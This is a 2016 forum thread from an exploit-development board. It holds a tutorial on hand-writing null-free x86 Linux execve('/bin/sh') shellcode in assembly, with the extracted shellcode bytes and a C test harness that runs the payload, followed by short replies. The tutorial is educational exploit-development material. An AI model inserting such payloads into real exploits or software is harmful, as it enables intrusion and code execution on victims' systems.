<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Linux Shellcoding (Part 1.0) - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="As promised, here is the shellcode tutorial once again 
Requirements
Alright so this isn’t going to be msfvenom tutorial. (shellcodes are payloads). 
This tutorial will focus on writing shellcodes using Assembly. 
Knowle&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="289.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Linux Shellcoding (Part 1.0)&#39;" href="289.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/8/8f75d8eec6b0c732db1dea91534e9a4f74ff0ea5.jpeg" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/8/8f75d8eec6b0c732db1dea91534e9a4f74ff0ea5.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/linux-shellcoding-part-1-0/289" />
<meta name="twitter:url" content="https://0x00sec.org/t/linux-shellcoding-part-1-0/289" />
<meta property="og:title" content="Linux Shellcoding (Part 1.0)" />
<meta name="twitter:title" content="Linux Shellcoding (Part 1.0)" />
<meta property="og:description" content="As promised, here is the shellcode tutorial once again  Requirements Alright so this isn’t going to be msfvenom tutorial. (shellcodes are payloads).  This tutorial will focus on writing shellcodes using Assembly.  Knowledge of C and Assembly is highly recommend. Also knowing how the stack works is a big plus.  Memory Segments When a program is run it is loaded in the RAM. Normally 5 segments are used in programs:  The stack segment (For function calls (dynamic)). The heap segment (For dynamicly ..." />
<meta name="twitter:description" content="As promised, here is the shellcode tutorial once again  Requirements Alright so this isn’t going to be msfvenom tutorial. (shellcodes are payloads).  This tutorial will focus on writing shellcodes using Assembly.  Knowledge of C and Assembly is highly recommend. Also knowing how the stack works is a big plus.  Memory Segments When a program is run it is loaded in the RAM. Normally 5 segments are used in programs:  The stack segment (For function calls (dynamic)). The heap segment (For dynamicly ..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="shellcode" />
<meta property="og:article:tag" content="asm" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="7 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="64 ❤" />
<meta property="article:published_time" content="2016-05-10T15:31:45+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="289%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="289.html">Linux Shellcoding (Part 1.0)</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/shellcode.html" class="discourse-tag" rel="tag">shellcode</a>,
<a href="../../tag/asm.html" class="discourse-tag" rel="tag">asm</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Linux Shellcoding (Part 1.0)">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content="shellcode, asm">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/8/8f75d8eec6b0c732db1dea91534e9a4f74ff0ea5.jpeg">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-10T15:31:45Z" class="post-time">
May 10, 2016, 3:31pm
</time>
<meta itemprop="dateModified" content="2016-08-31T16:50:43Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>As promised, here is the shellcode tutorial once again</p>
<h2>Requirements</h2>
<p>Alright so this isn’t going to be msfvenom tutorial. (shellcodes are payloads).<br>
This tutorial will focus on writing shellcodes using Assembly.</p>
<p>Knowledge of C and Assembly is highly recommend. Also knowing how the stack works is a big plus.</p>
<h2>Memory Segments</h2>
<p>When a program is run it is loaded in the RAM. Normally 5 segments are used in programs:</p>
<pre><code>The stack segment (For function calls (dynamic)).
The heap segment (For dynamicly allocating memory).
The data segment (Variables).
The bss segment (Variables).
The text segment (Set of instructions (The actual code)).
</code></pre>
<p>With assembly you have total control over these segments.<br>
In shellcoding however we will only be using the text and the stack segment.</p>
<h2>Assembly primer</h2>
<p>So first we need to know some assembly.</p>
<p><strong>The registers</strong><br>
We will be focusing on a couple of registers:</p>
<pre><code>The EAX register
The EBX register
The ECX register
The EDX register
The ESP register
</code></pre>
<p>These registers are like little pieces of memory that are in the CPU.<br>
They have nothing to do with RAM though as they are part of the CPU.<br>
The CPU uses these registers to do calculations and perform simple algorithms.</p>
<p>In assembly we adress these registers, they can be thought of as variables.</p>
<p><strong>Assembly instructions</strong><br>
There are some instructions that are important in assembly programming:</p>
<pre><code>MOV (assign, for example MOV EAX, 32 (EAX = 32)).
XOR (Exclusive OR, for example XOR EAX, EAX)
PUSH (Push something on the stack, example: PUSH EAX).
POP (Load what was on the stack in a register/variable, example: POP EBX).
CALL (Call a function, for example: CALL FuncPrint).
INT (Interrupt, kernel command, for example INT 0x80 which is used in calling syscalls).
</code></pre>
<p>Be sure that you understand these concepts.<br>
You can ofcourse try to learn what they mean from this tutorial,<br>
but it’s better to take your time to learn about these from a more in depth source.</p>
<h2>Syscalls</h2>
<p>What is important in shellcoding, is making use of syscalls.<br>
Syscalls are functions that the kernel recognizes, this means that if your shellcode calls a syscall,<br>
you don’t have to include headers or declare them.</p>
<p>here: <a href="http://syscalls.kernelgrok.com/" rel="noopener nofollow ugc">http://syscalls.kernelgrok.com/</a> you can find an overview of all linux x86 syscalls, look up syscall 11 (0xB).</p>
<p>A syscall takes arguments like normal functions, however syscalls are different in that they don’t use the stack.<br>
You can think of syscall parameters like argv[] in C:</p>
<p>argv[0] the ‘first’ argument (your program in C), would be the EAX register.<br>
This is also where you load the syscall number, for execve this is 11, or 0xB in hexa.</p>
<p>argv[1] is like the second argument and would be the EBX register. For example the string “/bin/bash”,</p>
<p>note that a string in C is called as a pointer, for example char *s = “Hello World”.<br>
The variable ‘s’ is a pointer and NOT the actual string, it’s a memory adress where the string is stored.<br>
s could be something like 0x4000b401. On 0x4000b401 you’d then find the value ‘/’ or 0x2f in hexa.<br>
This get’s read until the nullbyte 0x00. The actual string would never fit in the 32 bit registry.</p>
<p>The third argument is ECX, for execve this would be the arguments for the program that gets called (also a string).</p>
<h2>A too simple shellcode</h2>
<p>A shellcode is in many ways similar to a normal program, except for the fact that it uses the virtual space used by the program you are exploitating (so not his own).</p>
<p>The name shellcode is kind of misleading, it implies shellcodes are used to spawn shells, however nowadays there are many other uses for shellcodes,<br>
like <code>chmod 777</code> a certain program, or <code>download</code> and <code>execute</code> a file, nevertheless ‘shellcode’ was the name that stick.</p>
<p>Today we will be writing a simple shellcode that spawns a shell.</p>
<p>First though, we will write a normal assembly program. You will need nasm installed on your machine to compile it.<br>
<code>sudo apt-get install nasm</code>.</p>
<p>So here is the assembly program:</p>
<pre><code class="lang-auto">section .data
  msg db '/bin/sh' ; db stands for define byte, msg will now be a string pointer.
 
section .text
  global _start   ; Needed for compiler, comparable to int main()
 
_start:
  mov eax, 11     ; eax = 11, think of it like this mov [destination], [source], 11 is execve
  mov ebx, msg    ; Load the string pointer into ebx
  mov ecx, 0      ; no arguments in exc
  int 0x80        ; syscall
 
  mov eax, 1      ; exit syscall
  mov ebx, 0      ; no errors
  int 0x80        ; syscall
</code></pre>
<p>Copy and paste it in an editor and save as shell.asm<br>
To compile it use the following commands:<br>
<code>nasm -f elf -o shell.o shell.asm</code><br>
<code>ld -o shell shell.o</code><br>
Now run it with:<br>
<code>./shell</code></p>
<p>Awesome, a shell. This is what we wanted!, easy right?<br>
Now lets try to extract the shellcode.<br>
To do so use the command:<br>
<code>objdump -M intel -d shell</code><br>
This will result in:<br>
<a href="https://imgur.com/UYj7wms" target="_blank" rel="noopener nofollow ugc" class="onebox">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8f75d8eec6b0c732db1dea91534e9a4f74ff0ea5.jpeg" title="imgur.com" alt="Imgur" height="315" width="600">
</a>
<br>
Lets look at the 2nd line in _start, instead of msg, it says 0x80490a0. This the memory adress of the string msg.</p>
<p>This is a problem though. Remember that I said a shellcode doesnt use it’s own virtual space, but that of the program?<br>
This means, that the adress 0x80490a0 probably contains either garbage or nothing.<br>
Since the .data segment of our assembly program isn’t used in the shellcode.<br>
The shellcode would be:<br>
<code>"\xb8\x0b\x00\x00\x00\x00\xbb\xa0\x90\x04\x08\xb9\x00\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"</code><br>
Now we face another problem, nullbytes.</p>
<h2>Eliminating nullbytes</h2>
<p>Before we continue, let’s do an experiment with a C program.<br>
Open up an editor and write the simple program:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
int main()
{
    printf("Hello\x00 World!");

    return 0;
}
</code></pre>
<p>Compile and run.</p>
<p>Result:<br>
<code>Hello</code></p>
<p>So what happened here? If you’ve programmed with C you may know the problem here, strings use \x00 for terminating.<br>
In a bufferoverflow, the shellcode (which is a string) gets loaded on the stack.<br>
Therefore a nullbyte will terminate the chain of instructions.</p>
<p>So now let’s look at our program once again.</p>
<h2>XOR</h2>
<p>Like I said earlier XOR is an assembly instruction.<br>
XOR is like OR, however there is one major difference.<br>
Let’s look at two tables.</p>
<pre><code>OR:
1 OR 1 = 1
1 OR 0 = 1
0 OR 1 = 1
0 OR 0 = 0
</code></pre>
<p>and</p>
<pre><code>XOR:
1 XOR 1 = 0
1 XOR 0 = 1
0 XOR 1 = 1
0 XOR 0 = 0
</code></pre>
<p>So how is this relevant? Well remember that you can’t use nullbytes.<br>
So if you want to put 0 in a register, doing MOV EAX, 0, would cause a nullbyte.</p>
<p>Lets say the EAX register looks like this:<br>
&lt;many zero’s and one’s&gt;…0010001101<br>
XOR’ing EAX with itself would cause each bit to XOR itself.<br>
the bit is either 1 or 0.</p>
<pre><code>1 XOR 1 = 0.
0 XOR 0 = 0.
</code></pre>
<p>Therefore every bit gets set to 0.<br>
Doing so would be the same as mov eax, 0, but without the use of nullbytes.</p>
<p>Now let’s look at the code objdump once again.</p>
<p>Notice that the operation MOV EAX, 0xb, still gives nullbytes as a result.<br>
The reason for this is the fact that EAX is a 32 bit register.</p>
<p>You can read the line b8 0b 00 00 00 as:<br>
b8 (EAX) 0b (11) 00 00 00 which translates to: EAX = 00 00 00 0b, which translates to EAX = 11, or MOV EAX, 0xb.</p>
<h2>Adressing Lower Halves of Registries</h2>
<p>If you’re already familiar with assembly you might’ve read that EAX’s lower half can also be used for instructions.<br>
This lower half is called AX and is 2 bytes (16 bits) in size.</p>
<p>AX can also be split. the higher half is called AH and the lower half is called AL.<br>
Think of it like this:</p>
<pre><code>[---16bits---|--AH-8bits-|--AL-8bits-]
[---16bits---|-------16bits-AX-------]
[-----------32bits---EAX-------------]
</code></pre>
<p>So in order to assign 11 to EAX, we have to combine the things we discussed.<br>
First we need to make sure EAX doesn’t contain garbage values.<br>
To do so we zero EAX out with the XOR operator.<br>
XOR EAX, EAX<br>
Now we can assign 11 to the lower half of EAX.<br>
MOV AL, 0xb (11)</p>
<h2>Using the Stack to Store Variables</h2>
<p>So we already have the first argument for our syscall ready.</p>
<p>Now we need to assign a string pointer to EBX, but before we do that, we need something to point to, that is, the actual character array:</p>
<p><code>|'/'|'b'|'i'|'n'|'/'|'s'|'h'|\x00|</code></p>
<p>The only dynamic memory we can use for this is the stack.<br>
Note that each ascii character has a corresponding hex value, a table can be found <a href="http://www.asciitable.com/" rel="noopener nofollow ugc">http://www.asciitable.com/</a> here.<br>
from left to right the hexcodes are:<br>
0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x00.<br>
What we can do is push these on the stack. Then we can use the stack pointer ESP as a string pointer.<br>
Because the stack is FILO and grows downwards, we have to assign the values in reverse order.<br>
To push values on the stack you can use the command PUSH:<br>
PUSH , be aware that you can only push 4 bytes, each time.<br>
Now a problem arises. You cant push “/sh\x00” on the stack. as it will terminate the shellcode.<br>
To do so, we have to go back a few steps and look at our first two lines:</p>
<pre><code>XOR EAX, EAX
MOV AL, 0xb
</code></pre>
<p>Notice that after XOR EAX, EAX, EAX will have the value 0.</p>
<p>In shellcoding it is sometimes wiser to use this to our advantage as long as possible, because we now have a 0 we can assign, with this in mind we will postpone the COMMAND MOV AL, 0xb.</p>
<p>So instead of pushing 0x0068732f ("\x00hs/") on the stack. we split it in two parts: 0x00 and 0x68732f.<br>
Now instead of doing PUSH 0x00, we do PUSH EAX.<br>
It has the same result, but we avoided a nullbyte.<br>
Next we can do:</p>
<pre><code>PUSH 0x68732f2f (Added a / here to avoid a nullbyte).
PUSH 0x6e69622f
</code></pre>
<p>Now the the stack pointer will point to the string “/bin//sh”.<br>
So this will be our 2nd argument (EBX).</p>
<pre><code>MOV EBX, ESP
</code></pre>
<p>The third argument (ECX) for our syscall execve is a string with arguments for /bin/sh. Ofcourse we don’t want this to contain garbage, because that would result in sh not running and giving a warning about invalid arguments. Therefore we need ECX to be 0.</p>
<p>Once again we can use our EAX register.</p>
<pre><code>MOV ECX, EAX
</code></pre>
<p>Finally we assign EAX:</p>
<pre><code>MOV AL, 0xb
</code></pre>
<p>And do the syscall;</p>
<pre><code>INT 0x80
</code></pre>
<p>This leaves us with the following code:</p>
<pre><code class="lang-auto">section .text
  global _start

_start:
  xor eax, eax
  push eax
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  mov ecx, eax
  mov al, 0xb
  int 0x80
</code></pre>
<h2>Extracting the Shellcode</h2>
<p>Now let’s compile it<br>
<code>nasm -f elf -o shell.o shell.asm</code><br>
<code>ld -o shell shell.o</code></p>
<p>Now to get the shellcode I wrote this C program:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char *argv[])
{
        char l = 1;
        unsigned char buf;
        int fd;
        fd = open(argv[1],0,S_IRUSR);
        while(read(fd,&amp;buf,1)) {
                if(buf == 0 &amp;&amp; l == 1) {
                        printf(" \n");
                        l = 0;
                }
                else if(buf) {
                        printf("\\x%02x",buf);
                        l = 1;
                }
        }

        close(fd);
}
</code></pre>
<p>It will ignore caves of nullbytes and only show continues hexdumps.<br>
One of these lines is your shellcode.</p>
<p>To check if your shellcode works you can use this simple C program:</p>
<pre><code class="lang-auto">int main()
{
  char *shellcode = "&lt;the shellcode&gt;";

  (*(void(*)()) shellcode)();
}
</code></pre>
<p>That was all for today, hope you enjoyed it!</p>
<p>unh0lys0da</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="44" />
<span class="post-likes">44 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../programming-for-wannabees-part-iii-your-first-shell-code/1279.html">Programming for Wannabees. Part III. Your first Shell Code</a>
<meta itemprop="position" content="4">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../how-can-i-learn-to-form-strings-in-shellcodes/8992/2.html">How can I learn to form strings in shellcodes?</a>
<meta itemprop="position" content="5">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../forgs-wiki/4857.html">--Forg&#39;s Wiki--</a>
<meta itemprop="position" content="6">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../draft-0x00sec-turns-0x01-one-year/1914/2.html">0x00sec Turns 0x01! One year!</a>
<meta itemprop="position" content="7">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../over-the-wire-narnia1-environment-variables-and-shellcode/675.html">Over The Wire: Narnia1 - Environment variables and Shellcode</a>
<meta itemprop="position" content="8">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../elfun-file-injector/410.html">ELFun File Injector</a>
<meta itemprop="position" content="9">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../what-is-shellcode-and-how-to-creat-it/34127/2.html">What is Shellcode? and how to creat it?</a>
<meta itemprop="position" content="10">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../0x00sec-turns-0x01-one-year/1914.html">0x00sec Turns 0x01! One year!</a>
<meta itemprop="position" content="11">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../exploit-development-101/34164.html">Exploit Development 101</a>
<meta itemprop="position" content="12">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/WireWise"><span itemprop="name">WireWise</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-10T19:06:44Z" class="post-time">
May 10, 2016, 7:06pm
</time>
<meta itemprop="dateModified" content="2016-05-10T19:06:44Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great post unh0lys0da, really enjoyed reading it. Learning this myself, and this post really cleared up some things, Thank you.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-10T19:57:01Z" class="post-time">
May 10, 2016, 7:57pm
</time>
<meta itemprop="dateModified" content="2016-05-10T19:57:01Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Badass tutorial mate <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"> Love the insight.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/IoTh1nkN0t"><span itemprop="name">IoTh1nkN0t</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-10T23:56:00Z" class="post-time">
May 10, 2016, 11:56pm
</time>
<meta itemprop="dateModified" content="2016-05-10T23:56:00Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks, good to hear that.<br>
If you have any questions, post them here.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
(oaktree)
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T00:00:48Z" class="post-time">
May 11, 2016, 12:00am
</time>
<meta itemprop="dateModified" content="2016-05-11T00:00:48Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>As great as this post is, shellcoding will make my head hurt for at least a little while longer.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/AgentSniff"><span itemprop="name">AgentSniff</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T01:09:28Z" class="post-time">
May 11, 2016, 1:09am
</time>
<meta itemprop="dateModified" content="2016-05-11T13:40:08Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Wow! Very nice!</p>
<p>For those using Linux x64 based systems can check the system call list <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64" rel="nofollow noopener">here</a>.</p>
<p>to compile use <code>nasm -f flag = elf64</code> (nasm --help for more info)</p>
<p>The manual page of syscall (man syscall) also show a table with the registers used to pass the system call args</p>
<p>So the print code in x64 is like:</p>
<pre><code>section .data

        msg db 'Hello 0x00SEC',0x0a

section .text

        global _start

_start:

        mov rax,1       ; [1] - sys_write
        mov rdx,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        mov rsi,msg     ; pointer(mem address) to msg (*char[])
        mov rdx,14      ; msg size
        syscall         ; calls the function stored in rax

        mov rax,60      ; [60] - sys_exit
        mov rdx,0       ; exit with code rdx(0)
        syscall
</code></pre>
<p>To start or “execute” a shell like the first example, use [59]sys_execve instead of [1]sys_write.<br>
don’t forget to change the register values to fit sys-execve syntax</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Cromical"><span itemprop="name">Cromical</span></a>
</span>
<link itemprop="mainEntityOfPage" href="289.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-11T01:59:38Z" class="post-time">
May 11, 2016, 1:59am
</time>
<meta itemprop="dateModified" content="2016-05-11T01:59:38Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks! Same as <a class="mention" href="https://0x00sec.org/u/wirewise">@WireWise</a> this really helped clear up a load of things as well! Thanks.</p>
</div>
